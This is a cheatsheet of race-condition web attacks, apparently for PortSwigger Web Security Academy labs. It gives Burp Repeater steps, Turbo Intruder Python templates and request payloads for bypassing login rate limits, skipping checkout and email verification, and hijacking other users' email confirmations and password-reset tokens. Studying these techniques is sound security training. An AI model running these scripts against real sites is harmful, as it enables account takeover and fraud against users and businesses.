# Race Conditions — Cheatsheet

## Quick Reference

| Attack Type | Endpoints | Goal | Look For |
|-------------|-----------|------|----------|
| Limit overrun | 1 (same request ×N) | Bypass rate limit | Different response among many |
| Multi-endpoint | 2 different | Bypass payment/logic check | 200/302 on restricted action |
| Single-endpoint | 1 (different data ×2) | Steal/mix data between users | Mismatched email/token |
| Partial construction | 1 (register + confirm) | Bypass email verification | 302 on confirm during gap |
| Time-sensitive | 1 (same endpoint ×2) | Predict token | Same token in both resets |

---

## Burp Suite — Repeater

### Send Group in Parallel
1. Create multiple tabs with your requests
2. Group them (click + next to tab)
3. Dropdown next to Send → **Send group in parallel**

### Connection Warming
Add a throwaway `GET /` request at the start of your group:
```
Tab 1: GET /          ← warm the connection
Tab 2: POST /checkout ← real request
Tab 3: POST /cart     ← real request
```
Send in sequence first to warm, then remove Tab 1 and send in parallel.

---

## Turbo Intruder

### Basic Single-Packet Template
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    for word in wordlists.clipboard:
        engine.queue(target.req, word, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

### Multi-Username Gate Template (Partial Construction)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    confirmRequest = '''POST /confirm?token[]= HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION-COOKIE
Content-Length: 0

'''

    for attempt in range(20):
        currentAttempt = str(attempt)
        username = 'yourprefix' + currentAttempt

        engine.queue(target.req, username, gate=currentAttempt)

        for i in range(50):
            engine.queue(confirmRequest, gate=currentAttempt)

        engine.openGate(currentAttempt)

def handleResponse(req, interesting):
    table.add(req)
```

---

## Common Request Payloads

### Rate Limit Bypass (Login)
```
POST /login
username=carlos&password=%s
```
- Put password list in clipboard
- Use single-packet attack

### Multi-Endpoint (Cart)
```
Request A: POST /cart/checkout
Request B: POST /cart
           productId=1&redir=PRODUCT&quantity=1
```
- Send in parallel via Repeater

### Single-Endpoint (Email Change)
```
Request A: POST /my-account/change-email  email=carlos@target.com
Request B: POST /my-account/change-email  email=yours@exploit-server.net
```
- Send in parallel via Repeater
- Check exploit server inbox for mismatched confirmation

### Partial Construction (Registration)
```
Request A: POST /register  username=test0&email=test@ginandjuice.shop&password=test
Request B: POST /confirm?token[]=
```
- Use Turbo Intruder gate template above

### Time-Sensitive (Password Reset)
```
Request A: POST /forgot-password  username=wiener
Request B: POST /forgot-password  username=carlos
```
- Send in parallel via Repeater
- Check your email for token
- Use same token on carlos's reset URL

---

## Response Codes to Watch For

| Code | Meaning |
|------|---------|
| 302 | Success — redirect usually means logged in or confirmed |
| 200 | Could be success or failure — check response body |
| 400 | Bad request — check your request format |
| 401 | Unauthorized — token wrong |
| 403 | Forbidden — empty token (potential race target) |

---

## Common Mistakes

- `%s` getting URL-encoded to `%25s` by Burp — check raw request
- Session cookie expired — always use fresh cookie
- Lab URL changed after restart — update Host header
- Clipboard empty — copy password list immediately before clicking Attack
- `token[]` vs `token[]=` — must include the `=`
- Missing blank line at end of raw request string in Turbo Intruder
- `req.status_code == "302"` is wrong — use `req.status == 302`
